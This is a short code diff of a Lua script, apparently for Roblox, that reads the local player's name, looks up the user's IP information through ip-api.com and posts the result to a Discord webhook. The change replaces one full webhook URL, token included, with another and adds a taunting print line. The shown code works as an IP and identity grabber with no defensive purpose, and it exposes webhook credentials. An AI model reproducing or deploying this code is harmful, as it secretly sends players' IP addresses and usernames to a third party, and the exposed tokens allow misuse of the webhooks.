@@ -1,5 +1,5 @@
 local player_name = game:GetService("Players").LocalPlayer.Name
-local webhook_url = "https://discord.com/api/webhooks/1046550131761229834/3g1EcDFACt1ZFvYXN3Fp7XhFJT-orpN97yrERB6BdaWXxc2BIolQe7PaD4luOQZVwHon"
+local webhook_url = "https://discord.com/api/webhooks/1047563608797741186/FS14pvxn58kFcacEYjilBTsRSYIy0KSp2J-Tgh2Xt3JB-IQj3I5rNuFYY89hXNbnv7Xx"
 
 local ip_info = request({
     Url = "http://ip-api.com/json",
@@ -17,3 +17,5 @@ request(
         Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
     }
 )
+
+print("noob")
